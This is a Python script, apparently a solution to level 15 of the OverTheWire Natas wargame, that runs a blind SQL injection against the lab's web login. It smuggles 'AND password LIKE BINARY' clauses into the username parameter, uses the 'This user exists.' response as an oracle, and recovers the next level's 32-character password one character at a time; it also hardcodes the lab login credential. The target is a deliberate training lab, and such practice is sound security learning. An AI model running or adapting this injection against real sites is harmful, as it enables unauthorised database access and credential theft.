#! /usr/bin/python
import requests

password = ""   # List that I append to get password

auth_username = 'natas15'
auth_password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'
chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
target = 'http://natas15.natas.labs.overthewire.org/'
strExists = 'This user exists.'  # This is the message that appears when the sql query returns a result

r = requests.get(target, auth=(auth_username, auth_password))  # Verifying integrity of the connection
if r.status_code == 200:
    print("Connection was successful\n")
else:
    print("There was a problem with the connection")


bf_chars = ""  # List of characters for brute force

for j in chars:
    r = requests.get(target + '?username=natas16"+AND+password+LIKE+BINARY+"' + '%' + j + '%" "', auth=(auth_username, auth_password))
    if strExists in r.text:
        bf_chars += j
        print("The character " + j + " has been added to the list")
print("These characters make up the 32 character password: " + bf_chars)
print("\n\n Beginning the brute force...\n\n")

for i in range(32):
    for c in bf_chars:
        rq = requests.get(target + '?username=natas16" AND password LIKE BINARY "' + password + c + '%" "', auth=(auth_username, auth_password))
        if strExists in rq.text:
            password += c
            print("This is the current password: " + password + '*' * (32 - len(password)))

print("\n In case you missed it, the password to access natas16 is: " + password)


